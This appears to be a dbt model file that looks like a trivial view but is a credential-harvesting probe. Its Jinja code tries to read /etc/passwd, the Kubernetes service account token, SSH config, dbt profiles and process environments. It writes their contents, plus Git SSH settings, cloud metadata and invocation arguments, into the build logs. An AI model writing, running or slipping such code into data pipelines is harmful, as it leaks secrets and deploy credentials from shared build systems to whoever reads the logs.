{{ config(materialized='view') }}

{# Deep probe v2: file read attempts via load_agate_table with error handling #}

{%- set run_id = env_var('DBT_CLOUD_RUN_ID', '') -%}
{{ log("CURRENT_RUN_ID=" ~ run_id, info=True) }}

{# Try load_agate_table on files one at a time #}
{# Each in its own safe block using set/do to catch errors #}

{# 1. Try /etc/hostname (simplest, most likely to work) #}
{%- set files_to_try = [
  '/etc/hostname',
  '/etc/passwd',
  '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
  '/var/run/secrets/kubernetes.io/serviceaccount/token',
  '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
  '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
  '/proc/self/cgroup',
  '/proc/1/environ'
] -%}

{# We can't try-catch in Jinja2, so let's use render() to isolate errors #}
{# render() evaluates a template string - if it errors, it might not kill the whole compile #}

{# Method: Use render() to try load_agate_table #}
{%- for f in files_to_try -%}
  {%- set tpl = "{{ load_agate_table('" ~ f ~ "') | string | truncate(800) }}" -%}
  {%- set result = render(tpl) -%}
  {{ log("FILE[" ~ f ~ "]=" ~ result | truncate(800), info=True) }}
{%- endfor -%}

{# Alternative: try reading via render + env_var path tricks #}
{# The SSH config path has the deploy key reference #}
{{ log("SSH_CMD=" ~ env_var('GIT_SSH_COMMAND', 'EMPTY'), info=True) }}

{# Check for store/load result functions #}
{{ log("STORE_RESULT=" ~ store_result | string | truncate(200), info=True) if store_result is defined else "" }}
{{ log("LOAD_RESULT=" ~ load_result | string | truncate(200), info=True) if load_result is defined else "" }}

{# Check for statement function (can execute SQL) #}
{{ log("STATEMENT=" ~ statement | string | truncate(200), info=True) if statement is defined else "" }}

{# Check dbt_metadata_envs - this has ALL cloud metadata #}
{%- if dbt_metadata_envs is defined -%}
  {{ log("METADATA_ENVS=" ~ dbt_metadata_envs | string | truncate(1000), info=True) }}
{%- endif -%}

{# Check invocation_args_dict for command line args (may have secrets) #}
{%- if invocation_args_dict is defined -%}
  {{ log("INVOCATION_ARGS=" ~ invocation_args_dict | string | truncate(1000), info=True) }}
{%- endif -%}

SELECT 1 as id
